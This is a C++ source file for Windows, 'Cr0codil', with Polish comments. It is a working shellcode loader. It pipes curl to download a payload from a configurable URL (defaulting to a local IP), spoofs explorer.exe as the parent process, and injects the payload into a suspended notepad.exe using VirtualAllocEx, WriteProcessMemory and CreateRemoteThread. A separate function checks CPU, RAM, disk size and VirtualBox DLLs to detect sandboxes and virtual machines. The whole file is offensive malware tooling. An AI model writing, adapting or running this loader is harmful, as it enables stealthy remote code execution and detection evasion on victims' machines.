// Cr0codil.cpp : Ulepszona wersja z dynamicznym rozmiarem payloadu, konfigurowalnym URL i obsługą błędów
//

#include <iostream>
#include <windows.h>
#include <IPHlpApi.h>
#include <winhttp.h>
#include <stdlib.h>
#include <string.h>
#include <Psapi.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <cctype>
#include <sddl.h>       // dla ConvertSidToStringSidA (opcjonalnie)

#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "IPHlpApi.lib")

// Makro do logowania z timestampem
#define LOG(msg, ...) do { \
    SYSTEMTIME st; \
    GetLocalTime(&st); \
    printf("[%02d:%02d:%02d.%03d] ", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds); \
    printf(msg, ##__VA_ARGS__); \
    printf("\n"); \
    fflush(stdout); \
} while(0)

#define LOG_ERROR(msg, ...) do { \
    SYSTEMTIME st; \
    GetLocalTime(&st); \
    fprintf(stderr, "[%02d:%02d:%02d.%03d] ERROR: ", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds); \
    fprintf(stderr, msg, ##__VA_ARGS__); \
    fprintf(stderr, " (Error code: %d)\n", GetLastError()); \
    fflush(stderr); \
} while(0)

bool dynamicAnalysisCheck();
std::string GetConfigUrl(int argc, char* argv[]);
bool IsRunningAsAdmin();

int main(int argc, char* argv[])
{
    LOG("=== Cr0codil started ===");
    LOG("Command line arguments: %d", argc);
    for (int i = 0; i < argc; i++) {
        LOG("  argv[%d] = '%s'", i, argv[i]);
    }

    // Sprawdzenie uprawnień administratora
    if (IsRunningAsAdmin()) {
        LOG("Program is running with administrator privileges.");
    } else {
        LOG("WARNING: Program is NOT running as administrator. Some operations may fail.");
    }

    // ---------- Pobranie URL payloadu ----------
    LOG("Step 1: Getting payload URL...");
    std::string payloadUrl = GetConfigUrl(argc, argv);
    LOG("Using payload URL: %s", payloadUrl.c_str());

    // ---------- Przygotowanie komendy curl ----------
    LOG("Step 2: Preparing curl command...");
    std::string command = "curl \"" + payloadUrl + "\"";
    LOG("Command: %s", command.c_str());

    FILE* fpipe;
    std::vector<char> shellcode;
    char buffer[4096];
    size_t bytesRead;

    LOG("Step 3: Opening pipe to curl...");
    if (0 == (fpipe = (FILE*)_popen(command.c_str(), "rb"))) {
        LOG_ERROR("popen() failed");
        exit(EXIT_FAILURE);
    }
    LOG("Pipe opened successfully");

    LOG("Step 4: Downloading payload...");
    int chunkCount = 0;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), fpipe)) > 0) {
        chunkCount++;
        LOG("  Chunk %d: read %zu bytes", chunkCount, bytesRead);
        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);

        // Opcjonalne wyświetlanie postępu (tylko pierwsze 256 bajtów)
        if (shellcode.size() <= 256) {
            printf("    Data: ");
            for (size_t i = 0; i < bytesRead && (shellcode.size() - bytesRead + i) < 256; ++i) {
                if (isprint(static_cast<unsigned char>(buffer[i])))
                    putchar(buffer[i]);
                else
                    putchar('.');
            }
            printf("\n");
        }
    }
    LOG("Download completed. Total chunks: %d", chunkCount);
    
    int pipeCloseResult = _pclose(fpipe);
    LOG("Pipe closed with result: %d", pipeCloseResult);

    if (shellcode.empty()) {
        LOG_ERROR("No payload downloaded or empty file");
        return 1;
    }

    LOG("Payload downloaded successfully. Size: %zu bytes", shellcode.size());
    
    // Wyświetl pierwsze 16 bajtów payloadu (hex)
    LOG("First 16 bytes of payload (hex):");
    printf("  ");
    for (size_t i = 0; i < min(shellcode.size(), (size_t)16); i++) {
        printf("%02X ", static_cast<unsigned char>(shellcode[i]));
    }
    printf("\n");

    // ---------- Pobranie procesu explorer.exe ----------
    LOG("Step 5: Enumerating processes to find explorer.exe...");
    DWORD runningProcessesIDs[1024];
    DWORD runningProcessesCountBytes;
    DWORD runningProcessesCount;
    HANDLE hExplorerexe = NULL;

    if (!EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes)) {
        LOG_ERROR("EnumProcesses failed");
        return 1;
    }
    
    runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);
    LOG("EnumProcesses returned %d processes (%d bytes)", runningProcessesCount, runningProcessesCountBytes);

    int processChecked = 0;
    DWORD explorerPid = 0;
    for (DWORD i = 0; i < runningProcessesCount; i++) {
        if (runningProcessesIDs[i] != 0) {
            processChecked++;
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, runningProcessesIDs[i]);
            if (!hProcess) continue;

            char processName[MAX_PATH + 1];
            DWORD size = GetModuleFileNameExA(hProcess, 0, processName, MAX_PATH);
            if (size == 0) {
                CloseHandle(hProcess);
                continue;
            }
            processName[size] = '\0';
            _strlwr_s(processName);
            
            if (strstr(processName, "explorer.exe")) {
                LOG("  PID %d: Found explorer.exe at %s", runningProcessesIDs[i], processName);
                explorerPid = runningProcessesIDs[i];
                if (hExplorerexe) CloseHandle(hExplorerexe);
                hExplorerexe = hProcess;
                break;
            } else {
                CloseHandle(hProcess);
            }
        }
    }
    
    LOG("Process enumeration complete. Checked %d processes", processChecked);
    if (hExplorerexe) {
        LOG("Successfully obtained explorer.exe handle: 0x%p (PID: %d)", hExplorerexe, explorerPid);
        
        // Sprawdź, czy handle ma odpowiednie uprawnienia
        DWORD accessFlags = 0;
        if (GetHandleInformation(hExplorerexe, &accessFlags)) {
            LOG("Handle flags: 0x%08X", accessFlags);
        }
        
        // Spróbuj otworzyć silniejszy handle z PROCESS_CREATE_PROCESS
        HANDLE hStrong = OpenProcess(PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
                                     FALSE, explorerPid);
        if (hStrong) {
            LOG("Opened stronger handle to explorer.exe with PROCESS_CREATE_PROCESS: 0x%p", hStrong);
            CloseHandle(hExplorerexe);
            hExplorerexe = hStrong;
        } else {
            LOG("WARNING: Could not obtain PROCESS_CREATE_PROCESS access to explorer.exe (error %d). Parent process attribute may fail.", GetLastError());
        }
    } else {
        LOG("WARNING: Could not find explorer.exe process. Will create process without parent.");
    }

    // Opcjonalne sprawdzenia anty-debug/VM (zakomentowane)
    LOG("Step 6: Anti-debug/VM checks are disabled");

    // ---------- Blok wykonawczy z czyszczeniem ----------
    LOG("Step 7: Creating notepad.exe process...");
    int exitCode = 1;
    HANDLE hThread = NULL;
    void* exec = NULL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOEXA si = { 0 };
    SIZE_T payloadSize = 0;
    DWORD oldProtect = 0;
    bool useExtendedAttributes = true;  // flaga określająca, czy używać EXTENDED_STARTUPINFO

    do {
        RtlZeroMemory(&si, sizeof(STARTUPINFOEXA));
        RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

        // Przygotowanie atrybutów tylko jeśli mamy handle do rodzica
        if (hExplorerexe) {
            LOG("  Initializing PROC_THREAD_ATTRIBUTE_LIST...");
            SIZE_T attributeSize;
            if (!InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize)) {
                DWORD err = GetLastError();
                if (err != ERROR_INSUFFICIENT_BUFFER) {
                    LOG_ERROR("InitializeProcThreadAttributeList (size query) failed");
                }
            }
            LOG("  Attribute list size: %zu bytes", attributeSize);
            
            si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)new byte[attributeSize]();
            if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize)) {
                LOG_ERROR("InitializeProcThreadAttributeList (init) failed");
                delete[] reinterpret_cast<byte*>(si.lpAttributeList);
                si.lpAttributeList = NULL;
                useExtendedAttributes = false;
                LOG("  Will fall back to standard process creation (no parent)");
            } else {
                LOG("  Attribute list initialized successfully");
                
                LOG("  Setting parent process to explorer.exe (handle: 0x%p)", hExplorerexe);
                if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorerexe, sizeof(HANDLE), NULL, NULL)) {
                    LOG_ERROR("UpdateProcThreadAttribute failed");
                    DeleteProcThreadAttributeList(si.lpAttributeList);
                    delete[] reinterpret_cast<byte*>(si.lpAttributeList);
                    si.lpAttributeList = NULL;
                    useExtendedAttributes = false;
                    LOG("  Will fall back to standard process creation (no parent)");
                } else {
                    LOG("  Parent process attribute set successfully");
                }
            }
        } else {
            useExtendedAttributes = false;
        }
        
        if (useExtendedAttributes && si.lpAttributeList) {
            si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
        } else {
            // Użyj standardowego STARTUPINFO
            si.StartupInfo.cb = sizeof(STARTUPINFO);
        }

        LOG("  Calling CreateProcessA for notepad.exe...");
        BOOL createResult;
        DWORD creationFlags = CREATE_SUSPENDED;
        if (useExtendedAttributes && si.lpAttributeList) {
            creationFlags |= EXTENDED_STARTUPINFO_PRESENT;
        }
        
        createResult = CreateProcessA(
            "C:\\Windows\\notepad.exe",
            NULL,
            NULL,
            NULL,
            FALSE,
            creationFlags,
            NULL,
            NULL,
            &si.StartupInfo,
            &pi
        );
        
        if (!createResult) {
            DWORD err = GetLastError();
            LOG_ERROR("CreateProcessA failed with error %d", err);
            
            // Jeśli błąd dostępu i próbowaliśmy z atrybutami, spróbuj bez
            if (err == ERROR_ACCESS_DENIED && useExtendedAttributes) {
                LOG("  Access denied with extended attributes. Trying standard creation...");
                
                // Wyczyść atrybuty
                if (si.lpAttributeList) {
                    DeleteProcThreadAttributeList(si.lpAttributeList);
                    delete[] reinterpret_cast<byte*>(si.lpAttributeList);
                    si.lpAttributeList = NULL;
                }
                
                // Użyj standardowego STARTUPINFO
                RtlZeroMemory(&si, sizeof(STARTUPINFO));
                si.StartupInfo.cb = sizeof(STARTUPINFO);
                
                createResult = CreateProcessA(
                    "C:\\Windows\\notepad.exe",
                    NULL, NULL, NULL, FALSE,
                    CREATE_SUSPENDED,
                    NULL, NULL,
                    &si.StartupInfo,
                    &pi
                );
                
                if (!createResult) {
                    LOG_ERROR("Standard CreateProcessA also failed");
                    break;
                }
                LOG("  Standard process creation succeeded.");
            } else {
                break;
            }
        }

        LOG("  Process created successfully!");
        LOG("    Process ID: %d", pi.dwProcessId);
        LOG("    Thread ID: %d", pi.dwThreadId);
        LOG("    Process handle: 0x%p", pi.hProcess);
        LOG("    Thread handle: 0x%p", pi.hThread);

        LOG("Step 8: Allocating memory in target process...");
        payloadSize = shellcode.size();
        LOG("  Allocation size: %zu bytes", payloadSize);
        
        exec = VirtualAllocEx(pi.hProcess, 0, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!exec) {
            LOG_ERROR("VirtualAllocEx failed");
            break;
        }
        LOG("  Memory allocated at address: 0x%p", exec);

        LOG("Step 9: Writing payload to target process...");
        SIZE_T written;
        if (!WriteProcessMemory(pi.hProcess, exec, shellcode.data(), payloadSize, &written)) {
            LOG_ERROR("WriteProcessMemory failed");
            break;
        }
        LOG("  Written %zu bytes (expected %zu)", written, payloadSize);
        
        if (written != payloadSize) {
            LOG_ERROR("WriteProcessMemory wrote incomplete data");
            break;
        }
        LOG("  Payload written successfully");

        LOG("Step 10: Changing memory protection to PAGE_EXECUTE_READ...");
        if (!VirtualProtectEx(pi.hProcess, exec, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
            LOG_ERROR("VirtualProtectEx failed");
            break;
        }
        LOG("  Memory protection changed from 0x%08X to PAGE_EXECUTE_READ", oldProtect);

        LOG("Step 11: Creating remote thread to execute payload...");
        hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
        if (!hThread) {
            LOG_ERROR("CreateRemoteThread failed");
            break;
        }
        LOG("  Remote thread created successfully. Thread handle: 0x%p", hThread);

        LOG("Step 12: Resuming main thread...");
        DWORD resumeResult = ResumeThread(pi.hThread);
        if (resumeResult == (DWORD)-1) {
            LOG_ERROR("ResumeThread failed");
            break;
        }
        LOG("  Main thread resumed (previous suspend count: %d)", resumeResult);

        exitCode = 0;   // sukces
        LOG("=== Payload injected successfully! ===");
    } while (0);

    // ---------- Czyszczenie ----------
    LOG("Step 13: Cleanup...");
    if (hThread) {
        LOG("  Closing remote thread handle");
        CloseHandle(hThread);
    }
    if (exec && pi.hProcess) {
        LOG("  Freeing allocated memory in target process");
        VirtualFreeEx(pi.hProcess, exec, 0, MEM_RELEASE);
    }
    if (pi.hProcess) {
        LOG("  Closing process handle");
        CloseHandle(pi.hProcess);
    }
    if (pi.hThread) {
        LOG("  Closing main thread handle");
        CloseHandle(pi.hThread);
    }
    if (si.lpAttributeList) {
        LOG("  Deleting process thread attribute list");
        DeleteProcThreadAttributeList(si.lpAttributeList);
        delete[] reinterpret_cast<byte*>(si.lpAttributeList);
    }
    if (hExplorerexe) {
        LOG("  Closing explorer.exe handle");
        CloseHandle(hExplorerexe);
    }
    
    LOG("Cleanup complete. Exit code: %d", exitCode);
    LOG("=== Cr0codil finished ===");
    
    return exitCode;
}

// ---------- Funkcja sprawdzająca uprawnienia administratora ----------
bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup)) {
        if (!CheckTokenMembership(NULL, adminGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

// ---------- Funkcja pobierająca URL ----------
std::string GetConfigUrl(int argc, char* argv[])
{
    const std::string fallbackUrl = "http://192.168.0.32:8000/payload.bin";
    
    LOG("  Checking command line arguments...");

    // 1. Argument wiersza poleceń
    if (argc >= 2) {
        LOG("  Using URL from command line argument");
        return argv[1];
    }

    // 2. Plik conf.ini w katalogu programu
    LOG("  No command line URL, checking conf.ini...");
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string iniPath(exePath);
    size_t lastSlash = iniPath.find_last_of("\\/");
    if (lastSlash != std::string::npos) {
        iniPath = iniPath.substr(0, lastSlash + 1);
    }
    else {
        iniPath = "";
    }
    iniPath += "conf.ini";
    
    LOG("  Looking for config file: %s", iniPath.c_str());

    char urlBuffer[1024] = { 0 };
    DWORD result = GetPrivateProfileStringA(
        "Main",           // sekcja
        "PayloadURL",     // klucz
        "",               // wartość domyślna (pusta)
        urlBuffer,
        sizeof(urlBuffer),
        iniPath.c_str()
    );

    if (result > 0 && strlen(urlBuffer) > 0) {
        LOG("  Found URL in conf.ini: %s", urlBuffer);
        return std::string(urlBuffer);
    }
    
    if (GetLastError() != 0) {
        LOG("  Could not read conf.ini (error %d or file not found)", GetLastError());
    }

    // 3. Fallback
    LOG("  Using fallback URL: %s", fallbackUrl.c_str());
    return fallbackUrl;
}

// ---------- dynamicAnalysisCheck (zachowana dla kompletności) ----------
bool dynamicAnalysisCheck() {
    LOG("Running dynamic analysis checks...");
    
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    LOG("  CPU cores: %d", numberOfProcessors);
    if (numberOfProcessors < 2) {
        LOG("  FAIL: Less than 2 CPU cores");
        return false;
    }

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = static_cast<DWORD>(memoryStatus.ullTotalPhys / 1024 / 1024);
    LOG("  RAM: %d MB", RAMMB);
    if (RAMMB < 2048) {
        LOG("  FAIL: Less than 2048 MB RAM");
        return false;
    }

    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    if (hDevice == INVALID_HANDLE_VALUE) {
        LOG("  FAIL: Cannot open PhysicalDrive0");
        return false;
    }
    if (!DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL)) {
        LOG("  FAIL: Cannot get disk geometry");
        CloseHandle(hDevice);
        return false;
    }
    CloseHandle(hDevice);
    DWORD diskSizeGB = static_cast<DWORD>(
        pDiskGeometry.Cylinders.QuadPart * pDiskGeometry.TracksPerCylinder *
        pDiskGeometry.SectorsPerTrack * pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024
        );
    LOG("  Disk size: %d GB", diskSizeGB);
    if (diskSizeGB < 100) {
        LOG("  FAIL: Less than 100 GB disk");
        return false;
    }

    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData);
    if (hFind != INVALID_HANDLE_VALUE) {
        LOG("  FAIL: Found VirtualBox DLLs");
        FindClose(hFind);
        return false;
    }
    LOG("  No VirtualBox DLLs found");

    // Test połączenia internetowego
    LOG("  Testing internet connection...");
    HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { LOG("  FAIL: WinHttpOpen"); return false; }
    HINTERNET hConnection = WinHttpConnect(hSession, L"google.com", INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnection) { WinHttpCloseHandle(hSession); LOG("  FAIL: WinHttpConnect"); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
    if (!hRequest) { WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession); LOG("  FAIL: WinHttpOpenRequest"); return false; }
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, 0)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession);
        LOG("  FAIL: Send/Receive"); return false;
    }
    DWORD responseLength;
    if (!WinHttpQueryDataAvailable(hRequest, &responseLength)) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession);
        LOG("  FAIL: QueryDataAvailable"); return false;
    }
    PVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);
    if (!response) {
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession);
        LOG("  FAIL: HeapAlloc"); return false;
    }
    if (!WinHttpReadData(hRequest, response, responseLength, &responseLength)) {
        HeapFree(GetProcessHeap(), 0, response);
        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnection); WinHttpCloseHandle(hSession);
        LOG("  FAIL: ReadData"); return false;
    }
    if (response) HeapFree(GetProcessHeap(), 0, response);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnection) WinHttpCloseHandle(hConnection);
    if (hSession) WinHttpCloseHandle(hSession);
    
    LOG("  All dynamic analysis checks passed.");
    return true;
}
